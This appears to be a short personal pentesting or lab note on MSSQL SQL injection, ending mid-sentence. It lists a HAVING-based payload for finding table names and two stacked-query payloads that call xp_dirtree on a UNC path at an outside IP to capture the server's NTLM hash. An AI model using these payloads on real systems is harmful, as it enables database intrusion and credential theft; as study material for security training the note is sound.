![[WEAK REGISTRY#ERROR-BASED SQLi]]

#### FINDING TABLE NAME IN MSSQL 

**'HAVING 1=1--**

![[Pasted image 20260406044741.png]]

**GETTING NTLM HASH WITH STACKED SQLi QUERY**

```SQL
8 ; EXEC master..xp_dirtree '\\10.10.14.5\test'--
```

- THE `'` gives <mark class="hltr-mycolor">undisclosed quotation</mark> error the above one without this worked 
```SQL
8'; EXEC master..xp_dirtree '\\10.10.14.5\test'--
```

*if sqli is not working on *